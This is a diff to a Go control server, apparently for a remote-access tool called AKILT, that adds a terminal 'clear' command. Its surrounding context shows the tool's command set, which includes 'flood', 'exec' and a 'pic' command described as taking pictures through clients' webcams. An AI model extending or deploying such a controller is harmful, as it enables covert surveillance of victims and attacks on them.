@@ -15,6 +15,8 @@ import (
 	"strings"
 	"time"
 
+	tm "github.com/buger/goterm"
+
 	"github.com/Xart3mis/AKILT/Server/lib/bundles"
 	"github.com/Xart3mis/AKILTC/pb"
 	"google.golang.org/grpc"
@@ -73,6 +75,7 @@ var (
 		"select",
 		"dialog",
 		"flood",
+		"clear",
 		"exec",
 		"help",
 		"exit",
@@ -98,6 +101,12 @@ var banner string = `
   ░   ▒   ░ ░░ ░  ▒ ░  ░ ░     ░      
       ░  ░░  ░    ░      ░  ░         
 `
+
+func init() {
+	tm.Clear()
+	tm.MoveCursor(1, 1)
+	tm.Flush()
+}
 
 func main() {
 	go func() {
@@ -234,6 +243,10 @@ func main() {
 						color.Green.Print("pic: ")
 						log.Println("takes a picture through the clients' webcam. ")
 						color.Gray.Println("usage: [pic]")
+					case "clear":
+						color.Green.Print("clear: ")
+						log.Println("clears the terminal screen.")
+						color.Gray.Println("usage: [clear]")
 					}
 				}
 
@@ -402,9 +415,20 @@ func main() {
 				dialog_params = &DialogParams{ShouldUpdate: true, DialogPrompt: matches[0], DialogTitle: matches[1]}
 				<-dialog_done
 				log.Println(client_dialogoutput[current_id])
+
+			case "clear":
+				tm.Clear()
+				tm.MoveCursor(1, 1)
+				tm.Flush()
+
+				color.HiRed.Println(banner)
+				fmt.Println()
+
 			default:
 				color.Red.Println("unknown command.")
 			}
+
+			tm.Flush()
 		}
 	}
 
